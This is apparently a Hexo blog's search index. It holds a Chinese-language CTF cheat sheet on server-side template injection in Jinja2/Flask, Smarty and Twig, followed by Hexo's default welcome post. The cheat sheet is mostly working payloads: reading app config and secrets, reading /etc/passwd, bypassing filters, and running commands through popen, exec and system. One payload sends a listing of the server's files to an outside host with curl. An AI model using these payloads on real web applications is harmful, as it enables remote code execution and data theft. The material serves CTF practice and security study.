class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试环境如下：</p>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF SSTI</title>
      <link href="/2021/07/27/ctf-ssti/"/>
      <url>/2021/07/27/ctf-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SSTI-服务器模板注入"><a href="#CTF-SSTI-服务器模板注入" class="headerlink" title="CTF SSTI(服务器模板注入)"></a><strong>CTF SSTI(服务器模板注入)</strong></h1><h3 id="一丶基本判断"><a href="#一丶基本判断" class="headerlink" title="一丶基本判断"></a><strong>一丶基本判断</strong></h3><p><img src="https://i.loli.net/2021/07/28/hYPU4l68D7xAg9Z.png"></p><hr><h3 id="二丶渲染模板（flask-jinja）"><a href="#二丶渲染模板（flask-jinja）" class="headerlink" title="二丶渲染模板（flask/jinja）"></a><strong>二丶渲染模板（flask/jinja）</strong></h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><table><thead><tr><th align="left"><strong>dict</strong></th><th>保存类实例或对象实例的属性变量键值对字典</th></tr></thead><tbody><tr><td align="left"><strong>class</strong></td><td>返回类型所属的对象</td></tr><tr><td align="left"><strong>mro</strong></td><td>返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</td></tr><tr><td align="left">bases</td><td>返回该对象所继承的基类</td></tr><tr><td align="left"><strong>subclasses</strong></td><td>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</td></tr><tr><td align="left"><strong>init</strong></td><td>类的初始化方法</td></tr><tr><td align="left">globals</td><td>对包含函数全局变量的字典的引用</td></tr></tbody></table><h5 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a><strong>一些姿势</strong></h5><ul><li><p>[浅析SSTI(python沙盒绕过)]: </p></li><li><p><strong>config</strong></p><p><code>{{config}}</code>可以获取当前设置，如果题目类似<code>app.config ['FLAG'] = os.environ.pop（'FLAG'）</code>，那可以直接访问<code>{{config['FLAG']}}</code>或者<code>{{config.FLAG}}</code>得到flag</p></li><li><p><strong>self</strong></p><pre class="line-numbers language-none"><code class="language-none">{{self\}\} ⇒ &lt;TemplateReference None&gt;{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>[]  ()  “”</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br> <code>{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}</code></p></li><li><p>url_for,g,request,namespace,lipsum,range,session,dict,get_flashed_message,config</p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）</p><pre class="line-numbers language-none"><code class="language-none">{{url_for.__globals__['current_app'].config.FLAG}}{{get_flashed_messages.__globals__['current_app'].config.FLAG}}{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a><strong>常用绕过</strong></h5><ol><li><p>以下表示法可用于访问对象的属性：</p><ul><li><code>request.__class__</code></li><li><code>request["__class__"]</code></li><li><code>request|attr("__class__")</code></li></ul></li><li><p>可以使用以下方法访问数组元素：</p><ul><li><code>array[0]</code></li><li><code>array.pop(0)</code></li><li><code>array.__getitem__(2)</code></li></ul></li><li><p>过滤[]和.</p><p>只过滤<code>[]</code>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br> <code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()</code><br> 若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code>将<code>request.__class__</code>改成<code>request|attr("__class__")</code></p></li><li><p>过滤_</p><p>利用<code>request.args</code>属性</p><pre class="line-numbers language-none"><code class="language-none">{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p></li><li><p>关键词过滤</p><ul><li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>​      例如被过滤掉<code>__class__</code>关键词</p><pre class="line-numbers language-none"><code class="language-none">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>字符串拼接绕过</p><pre class="line-numbers language-none"><code class="language-none">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>过滤  {   {</p><p>使用{ % if … %}1{ % endif  % }，例如</p><pre class="line-numbers language-none"><code class="language-none">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;')%}1{% endif %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><pre class="line-numbers language-none"><code class="language-none">{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'%}1{% endif%}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>引号内十六进制绕过</p><pre class="line-numbers language-none"><code class="language-none">{{"".__class__}}{{""["\x5f\x5fclass\x5f\x5f"]}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>_<code>是</code>\x5f<code>，</code>.<code>是</code>\x2E</p></li><li><p>“ ‘ chr等被过滤，无法引入字符串</p><ul><li>直接拼接键名</li></ul><pre class="line-numbers language-none"><code class="language-none">dict(buil=aa,tins=dd)|join()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><pre class="line-numbers language-none"><code class="language-none">(app.__doc__|list()).pop(102)|string()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><pre class="line-numbers language-none"><code class="language-none">{%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c{%set i1=dict(a=i1,c=udl%(99)).values()|join %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>+被过滤，无法拼接字符串</p></li></ol><ul><li><code>~</code><br> 在jinja中可以拼接字符串</li><li>格式化字符串<br> 同上</li></ul><hr><h3 id="三丶Smarty"><a href="#三丶Smarty" class="headerlink" title="三丶Smarty"></a><strong>三丶Smarty</strong></h3><p><a href="https://www.jianshu.com/p/eb8d0137a7d3">Smarty SSTI</a></p><ol><li><p>{php}{/php}</p><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p></li><li><p>{literal}</p><p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p><p>那么对于php5的环境我们就可以使用</p><script language="php">phpinfo();</script></li><li><p>{if}</p><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等</p></li><li><p>getStreamVariable</p><p>新版本失效<br> <code>{self::getStreamVariable("file:///etc/passwd")}</code></p><hr><h3 id="四丶twig"><a href="#四丶twig" class="headerlink" title="四丶twig"></a><strong>四丶twig</strong></h3><p><strong>文件读取</strong></p><pre class="line-numbers language-none"><code class="language-none">{{'/etc/passwd'|file_excerpt(1,30)}}{{app.request.files.get(1).__construct('/etc/passwd','')\}\}{{app.request.files.get(1).openFile.fread(99)\}\}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>rce</strong></p><pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("id")}}{{['cat /etc/passwd']|filter('system')}}POST /subscribe?0=cat+/etc/passwd HTTP/1.1{{app.request.query.filter(0,0,1024,{'options':'system'})}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/27/hello-world/"/>
      <url>/2021/07/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
